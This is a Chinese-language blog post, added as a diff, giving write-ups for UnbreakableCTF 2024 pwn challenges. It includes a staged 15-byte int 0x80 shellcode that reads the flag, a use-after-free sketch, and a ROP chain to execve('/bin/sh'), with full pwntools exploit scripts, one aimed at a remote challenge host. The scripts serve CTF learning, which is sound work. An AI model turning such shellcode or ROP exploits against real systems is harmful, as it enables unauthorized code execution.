@@ -1,0 +1,141 @@
+export const layout = "#components/Page.js";
+export const title = "UnbreakableCTF 2025 Writeup";
+export const description = "2024 UnbreakableCTF Pwn 题解";
+export const created = "2024-04-09";
+
+
+# Unbreakable CTF 2024 Pwn WriteUps
+
+复现了 UnbreakableCTF 2024 的二进制方向，动手做了两道题，口胡了一道堆题，有一些感悟和反思放在这里。
+
+## harder_assembly
+
+### 思路
+
+一道 x64 的shellcode 题，难点是禁止在 shellcode 里使用 syscall 以及shellcode 长度只有 15 字节。
+
+后者比较好解决，可以考虑直接调用 `read` 构造二次输入，这样二次输入的时候就没有长度限制了，构造 orw 即可。
+
+这里我遇到的知识盲区主要是禁用了 syscall，解决方法是使用 int 0x80（即继续使用 x32 API）
+
+翻了一下 stackoverflow，注意到这样一段话：
+
+> When called from a 64-bit program it behaves the same way it would behave like if it has been called from a 32-bit program (using the 32-bit calling convention).
+
+> This also means that the parameters for "int 0x80" will be passed in 32-bit registers and the upper 32 bits of the 64-bit registers are ignored.
+
+所以如果要在 x64 下使用 int0x80 构造 read 函数系统调用时，得注意遵守相应的 x32 API 使用规范。
+
+### 脚本
+
+```python
+
+from pwn import *
+
+proc = "./harder"
+context.binary = proc
+context.log_level = "debug"
+io = process(proc)
+
+if args.G:
+    gdb.attach(io)
+
+orw = b'\xb0\x03\xb9\x00@@\x00\xcd\x80h\x00@@\x00\xc3'
+# input()
+io.send(orw)
+orw = asm(shellcraft.open("./flag", 0))
+orw += asm(shellcraft.sendfile(1, 3, 0, 0x7f))
+input()
+io.sendline(orw)
+io.interactive()
+
+
+"""
+In [1]: asm("""
+   ...:     mov al, 3
+   ...:     mov ecx, 0x404000
+   ...:     int 0x80
+   ...:     push 0x404000
+   ...:     ret
+   ...:     """)
+"""
+```
+
+
+构造的第一次 shellcode 贴在脚本下方了。
+
+
+## heeap
+
+这题我没具体做，自己口胡了个大致思路（因为队友切太快了.jpg
+
+题目给了 backdoor 函数，用 UAF，先申请 "description"，然后把对应的 ctf 块位置的 print 函数地址改成 backdoor，free 掉之后申请给 ctf即可（因为观察到 ctf 块和 description 块的大小是一样的，只是 print 函数的相对位置不一样罢了）
+
+## not_allowed
+
+### 思路
+
+![image.png](https://s2.loli.net/2024/04/08/VOkrH89C3upTK71.png)
+
+题目给了一个很明显的栈溢出漏洞，由于题目函数列表中没有 puts/printf 等输出函数，与其 syscall write 不如 syscall execve，问题在于 gadget 比较少，一开始只看到了 `pop_rdi_ret` 和 `syscall`，`pop_rsi_ret` 和 `pop_rdx_ret` 都看不到..
+
+不过这不代表凑不出来 gadgets 去 syscall `execve('/bin/sh', 0, 0)`，我们想一想要做的无非以下 4 件事情：
+
+- 给 rdi搞到sh
+- rsi 为 NULL
+- rdx 为 NULL
+- rax 为 0x3b
+
+第一个很好做，题目给了 backdoor，可以拿到 /bin/sh 的内存位置；
+
+第二个不一定非要用 `pop_rdi_ret`，下面这个也行：
+
+```
+0x0000000000401161 : sub rax, rax ; ret
+0x00000000004011c1 : xor rsi, rsi ; mov rsi, rax ; ret
+```
+
+同理，用下面这个可以做到第三个（rax 已经为0）：
+
+```
+0x000000000040116e : imul edx ; shr rdx, 0x3f ; ret
+```
+
+至于最后一个，也有两种做法，法一是用下面这个：
+
+```
+0x00000000004011ce : inc al ; ret
+```
+
+重复 0x3b 次即可修改 rax 为 0x3b。
+
+法二可以构造一个 read，读入 0x3b 个数据，利用 rax 储存函数返回值来给 rax 赋值，后者更短一些，不过我图省事直接按第一个打了。
+
+```python
+from pwn import *
+
+proc = "./pwn"
+context.log_level = "debug"
+context.binary = proc
+io = process(proc)
+io = remote("35.234.88.19", 31170)
+
+if args.G:
+    gdb.attach(io)
+
+
+wish_addr = 0x401175
+binsh_addr = 0x40407d
+pop_rdi_ret = 0x401156
+xor_rsi_ret = 0x4011c1
+sub_rax_ret = 0x401161
+imul_edx_ret = 0x40116e
+add_rax_ret = 0x4011ce
+syscall = 0x4011cc
+
+payload = b"a" * 32 + b"b" * 8 + flat([wish_addr, pop_rdi_ret, binsh_addr, sub_rax_ret, xor_rsi_ret, imul_edx_ret])
+payload += p64(add_rax_ret) * 59 + p64(syscall)
+# input()
+io.sendline(payload)
+io.interactive()
+```
